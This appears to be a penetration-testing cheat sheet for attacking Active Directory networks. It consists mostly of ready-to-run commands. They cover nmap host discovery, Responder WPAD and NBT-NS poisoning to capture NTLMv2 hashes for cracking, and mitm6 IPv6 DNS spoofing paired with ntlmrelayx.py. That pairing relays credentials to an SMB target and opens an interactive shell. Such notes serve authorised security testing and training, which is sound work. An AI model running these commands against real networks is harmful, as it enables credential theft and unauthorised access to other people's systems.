https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/

* Do I have an IP address?
```
> ipconfig
$ ifconfig
```

* Check if there are other hosts on my network segment
```
nmap -sn 192.168.1.1/24
```
  - Remember `-sn` is an ICMP ping, use others where nothing returned


* Startup **[Responder](https://github.com/SpiderLabs/Responder)**
  - WPAD and NBT-NS poisoning:

  - Listening for WPAD requests:
  ```
  responder -I eth0 --wpad
  ```
  - Gets hash in NTLMv2 format -> hashcat / john

* mitm6
  - Another technique that utilizes IPv6 and DNS to relay credentials to a target.
  - By default, IPv6 is enabled and actually preferred over IPv4, meaning if a machine has an IPv6 DNS server, it will use that over the IPv4.
  - Also by default, Windows machines look for an IPv6 DNS server via DHCPv6 requests, which if we spoof with a fake IPv6 DNS server, we can effectively control how a device will query DNS.
  - More can be read [here](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/).

  ```
  git clone https://github.com/fox-it/mitm6.git
  cd mitm6
  pip install .

  mitm6 -d lab.local
  ```
  - So now we leverage the fact that we control DNS with spoofing WPAD answers again via ntlmrelayx.py. I wrote a guide on how to set it up here.
  - With mitm6 running in one window, open another and run ntlmrelayx.py
  ```
  ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
  ```
    - wh: Server hosting WPAD file (Attacker’s IP)
    - t:  Target (You cannot relay credentials to the same device that you’re spoofing)
    - i:  open an interactive shell
